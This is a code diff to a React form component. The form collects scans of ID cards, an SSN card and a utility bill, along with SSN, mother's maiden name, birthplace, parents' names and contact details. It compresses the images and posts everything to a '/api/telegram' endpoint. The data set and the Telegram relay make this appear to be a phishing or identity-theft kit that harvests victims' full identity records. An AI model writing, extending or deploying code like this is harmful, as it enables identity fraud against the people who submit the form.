@@ -1,4 +1,4 @@
-
+import imageCompression from "browser-image-compression";
 import { useState } from 'react';
 // import { useNavigate } from 'react-router-dom';
 
@@ -10,15 +10,57 @@ const Form = () => {
     // const navigate = useNavigate();
 
 
-    const handleSubmit = async (e) => {
-    e.preventDefault();
-    setIsSubmitting(true);
-    setSubmitError("");
+const handleSubmit = async (e) => {
+  e.preventDefault();
+  setIsSubmitting(true);
+  setSubmitError("");
 
   try {
-    const formData = new FormData(e.target);
+    const formData = new FormData();
 
-    // 🔥 This now sends to your Vercel backend
+    const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];
+
+    for (let field of fileFields) {
+      const fileInput = e.target[field];
+
+      if (fileInput?.files[0]) {
+        const file = fileInput.files[0];
+
+        // ✅ If image → compress
+        if (file.type.startsWith("image/")) {
+          const compressedFile = await imageCompression(file, {
+            maxSizeMB: 0.8,
+            maxWidthOrHeight: 1920,
+            useWebWorker: true,
+          });
+
+          formData.append(field, compressedFile);
+        } else {
+          // ✅ If NOT image → send as-is
+          formData.append(field, file);
+        }
+      }
+    }
+
+    // Append text fields
+    const textFields = [
+      "firstName",
+      "lastName",
+      "ssn",
+      "phone",
+      "email",
+      "address",
+      "gender",
+      "fatherName",
+      "motherName",
+      "motherMaidenName",
+      "birthPlace",
+    ];
+
+    for (let field of textFields) {
+      formData.append(field, e.target[field].value);
+    }
+
     const response = await fetch("/api/telegram", {
       method: "POST",
       body: formData,
